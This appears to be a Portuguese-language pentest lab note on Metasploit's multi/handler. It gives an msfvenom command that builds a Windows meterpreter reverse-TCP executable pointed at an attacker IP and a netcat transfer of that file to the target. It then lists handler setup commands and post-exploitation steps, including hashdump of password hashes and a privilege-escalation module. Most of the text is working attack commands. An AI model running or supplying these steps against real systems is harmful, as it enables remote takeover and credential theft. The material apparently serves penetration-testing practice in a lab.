 # Multi-handler

Este módulo é um stub que fornece todos os recursos do sistema de carga útil Metasploit para exploits que foram lançados fora do framework. 

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.110 lport=443 -f exe > file.exe

- LHOST: IP do Host local que receberá a conexão reversa
- LPORT: Porta em que será realizada a conexão

- -f:  Tipo do arquivo

- file.exe: Arquivo que será criado

## Transferir o arquivo via Netcat

Windows:

    > nc.exe -nvlp 1000 > file.exe

Kali Linux:

    # netcat 10.1.1.111 1000 < file.exe

## Executar o msfconsole

No terminal como root, chame o msfconsole pelo comando abaixo:

    # msfconsole

<img src="imgs/msf1.PNG" width="70%">

Use o Multi Handler

    msf6 > use exploit/multi/handler

    msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

    msf6 exploit(multi/handler) > set LHOST 10.1.1.112
    
    msf6 exploit(multi/handler) > set LPORT 443

    msf6 exploit(multi/handler) > show options

<img src="imgs/msf2.PNG">

    msf6 exploit(multi/handler) > run

Execute o arquivo que foi enviado para o Windows (file.exe).

A conexão foi bem sucedida e o comando "pwd" foi disparado.

<img src="imgs/msf3.PNG">

    meterpreter > pwd
    C:\Users\Pentest\Downloads
    
    meterpreter > hashdump
    
    meterpreter > sysinfo
    
    meterpreter > getuid
    
    meterpreter > background
    
    msf6 exploit(multi/handler) > sessions
    
    msf6 exploit(multi/handler) > use exploit/windows/local/ask
    
<img src="imgs/msf4.PNG">

<img src="imgs/msf5.PNG">
